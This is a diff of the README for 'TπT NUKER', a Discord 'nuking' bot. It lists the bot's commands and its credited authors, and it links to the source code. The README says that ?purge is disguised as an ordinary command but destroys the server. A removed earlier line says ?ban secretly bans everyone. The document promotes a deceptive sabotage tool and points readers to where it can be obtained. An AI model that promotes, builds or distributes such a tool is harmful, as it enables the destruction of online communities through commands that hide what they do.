@@ -1,24 +1,28 @@
-# TπT NUKER v2
+# TπT NUKER
 The best nuking bot in Discord?
-### Code by:TπT_U§€®βrμh
-### Co-directors:bluckguy , farts_smella_or_smart_fella , Treeto7king
-### Supporters:deathmare07 , cometthewolf , youaregoddamnpathetic , novawarrior_9272
+
+Coded by: TπT_U§€®βrμh
+
+Co-directors: bluckguy , farts_smella_or_smart_fella , Treeto7king
+
+Supporters: deathmare07 , cometthewolf , youaregoddamnpathetic , novawarrior_9272
 
 <img width="600" height="600" alt="image" src="https://github.com/user-attachments/assets/afcf6067-f4b7-45bf-8ac0-abfce89047d5" />
 
-
 # Commands:
-### ?start
-### destroys server
-### ?stop
+## ?purge
+### disguised as a purge command and destroys server
+## ?stop (OWNER)
 ### stops the nuke and logs out the bot
-### ?ping
+## ?ping
 ### show latency of bot
-### ?invite
-### show fake invite count
-### ?ban
-### disguised as a single ban cmd but NO, it bans everyone instead
-### ?kick
-### same as ban but kick ppl
+## ?invite
+### show invite count
+## ?ban
+### bans a member
+## ?unban
+### unban a member
+## ?kick
+### kick someone's ass
 
-# [This is the bot's source code. For more info click here](https://github.com/Tnt-Userbruh/TnT-NUKER/)
+# [source code here]([https://github.com/Tnt-Userbruh/TnT-NUKER/](https://colab.research.google.com/drive/1A8OsWDk-uzLRX65WJ58CELNuMDlH5oy4#scrollTo=u802VrHQy094))
